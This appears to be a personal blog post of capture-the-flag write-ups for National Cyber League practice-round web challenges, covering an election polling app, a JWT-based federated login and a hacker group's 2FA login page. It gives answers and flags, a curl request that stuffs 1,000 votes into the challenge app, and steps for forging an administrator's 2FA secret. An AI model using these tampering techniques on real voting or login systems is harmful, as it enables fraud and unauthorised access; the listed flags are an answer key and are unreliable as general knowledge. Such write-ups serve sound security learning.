---
layout: post
title: "NCL Practice Round Writeups: Web Application Exploitation"
author: GlitchGecko
tagline: Writeups for the NCL practice round Web Application Exploitation challenges
tags:
- National Cyber League
- Cyber Skyline
- CTF
- Writeup
- Web Application Exploitation
---

NCL practice round Web Application Exploitation challenge writeups

---

Following a short break after this year's CCDC, I jumped back into the CTF grind and started studying Crypto and Binary Exploitation. I've been looking for an opportunity to utilize my new skills, and it just so happens that my Cyber Defense Club was looking to sign a team up for the National Cyber League.

It definitely seems like I've learned a lot, especially since at the time of writing this, I'm 8th place out of almost 8,000 participants in the practice round, with over 95% challenge completion.

To help others (mostly my team at Lewis University), I've decided to create writeups for each challenge.

The following is a list of each Web Application Exploitation challenge:

## Election Hacking (Easy)
#### Description: "The Metropolis City elections are coming and the City Election Commission is implementing a brand new web app to aggregate polling data. The City Election Commission is asking that you pentest the service to identify any vulnerabilities and ensure election security."

### How many precincts are there in the city?
5

### How many candidates are running in this election? (5 pts)
4

### What is the maximum number of votes that a candidate can receive in a precinct? (5 pts)
10

### What is the URL path to the City Wide Report page? (20 pts)
View source on main page
`<html><head><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><script src="https://code.jquery.com/jquery-3.3.1.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/superagent/3.8.0/superagent.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.11/lodash.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cyberskyline/semantic-ui@master/dist/semantic.min.css"/><title>Metropolis Election Polling App</title></head><body style="padding: 16px; background: linear-gradient(110deg, #004476 -10%, #00beff 130%);"><div class="ui container"><h1 class="ui light inverted header center aligned" style="margin: 2em;"><a class="content" href="/" style="color: #FFFFFF;">Metropolis Election Polling App</a></h1><div class="ui segment very padded piled" style="max-width: 500px; margin: auto"><h1 class="ui light header center aligned"><div class="content">Precinct Reporting Login</div></h1><form class="ui form" method="POST" action="/login"><div class="field"><label>Precinct #</label><div class="ui input"><input name="precinct" type="number" min="1" max="5" placeholder="Enter your polling precinct here" required="required"/></div></div><div class="field"><button class="ui fluid blue button">Click here to log in</button><!-- TODO: report page link - /total-count/5399 --></div></form></div><p style="color: rgba(255,255,255,0.5); font-size: 10px; text-align: center; margin-top: 5em;">Metropolis Election Polling App Challenge | &copy; 2020 Cyber Skyline</p></div></body></html>`

https://388655cbfc085088c14ace315e855600-shade-llc.web.cityinthe.cloud/total-count/5399

### To demonstrate that the web app is vulnerable, help "L. Hacker" win the election by taking majority vote in every precinct. Submit Flag 1 once you accomplish this task. (25 pts)
SKY-TEXA-5129

### Demonstrate that the web app has an even more severe vulnerability that allows attackers to vote more than the total number of possible votes and win the election. Submit Flag 2 once you accomplish this task. (40 pts)
`curl https://388655cbfc085088c14ace315e855600-shade-llc.web.cityinthe.cloud/votes/5 -X POST -d 'L. Hacker=1000' -H 'Content-Type: application/x-www-form-urlencoded'`
SKY-ZTND-8757

## MetroGov (Medium)
#### Description: "As more and more services are moving online, Metropolis City has implemented a federated login system to help its citizens to securely authenticate themselves for the various online resources. The service is implemented using an industry standard and has been deemed very secure by industry experts.

#### However, we're seeing reports from various city online resources that they're getting a lot of people logging in as the "administrator" account which seems like it shouldn't be possible. Identify the vulnerability and perform a proof of concept attack on MetroGov Federated Login."

Q1 - 15 points
What is the name of the standard used for securing user sessions?
JWT

Q2 - 20 points
What is the cryptographic scheme used for securing user sessions?
HS256
	
Q3 - 20 points
How long (in minutes) after login will the user session expire?
5
	
[cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUZ6Wkdabklpd2lhV0YwSWpveE56RXhPVEUzTURjekxDSmxlSEFpT2pFM01URTVNVGN6TnpNc0ltbHpjeUk2SW1OcGRIbHBiblJvWlM1amJHOTFaQ0o5Ljd1SlVBMkV5VEZaejkyZ25pam5IMWVjT3VKX1Rjc0pXbnp2MHFrMkt0dWs)

`{"alg":"HS256","typ":"JWT"}{"username":"asdfg","iat":1711917073,"exp":1711917373,"iss":"cityinthe.cloud"}Ã®Ã¢Ta2LVsÃ·h'ÂŠ9Ã‡Ã•Ã§Â¸Â”ÃœÂ°Â•Â§ÃŽÃ½*Â“bÂ­Âº`

Q4 - 60 points
What is the flag displayed after logging in as the "administrator" account?
SKY-FQFX-6251

https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens


## Hacker Login (Hard)
#### Description: "We've located a suspicious login page that looks like it belongs to the nefarious Liber8tion hacker group, can you find any weaknesses in their portal?"

What database software is being used?
sqlite

What is the name of the only account with a valid password?
admin

What is the admin's 2FA secret, in base32 representation?
```html
<script>$(document).ready(function() {
    var gen = $('.GenerateQR');
    gen.on('click', function(e) {
        e.stopPropagation();
        superagent.post('/generate').send({ name : "asdfg", timestamp : "1711918303143" }).then(function(response) {
            setTimeout(function() {window.location.reload()}, 1000);
        }).catch(function(err) {
            var error = err.response.body.error;
            console.error(error);
        });
    })
});
</script>
```

```sh
nicolas:/tmp/cybersky:$ zbarimg Untitled.png 
QR-Code:otpauth://totp/Liber8tion - Reset(asdfg)?secret=MFZWIZTHPQYTOMJRHEYTQMZQGMYTIMY=
```

[cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base32('A-Z2-7%3D',false)&input=TUZaV0laVEhQUVlUT01KUkhFWVRRTVpRR01ZVElNWT0)

[cyberchef2](https://gchq.github.io/CyberChef/#recipe=To_Base32('A-Z2-7%3D')&input=YWRtaW58MTYwOTE4MDAxOTM4OQ)

MFSG22LOPQYTMMBZGE4DAMBRHEZTQOI

[OTP](https://it-tools.tech/otp-generator)

What is the flag?
SKY-PNVT-9942

# Final thoughts

Even though this was just the practice round, I had a lot of fun working my way through the challenges! I'm very happy with my noticable skill improvement, and I'm definitely excited to see how the individual and team rounds go.

Make sure to check out my other writeups!

![Scorecard](https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/NCL_SP_2024/score.png)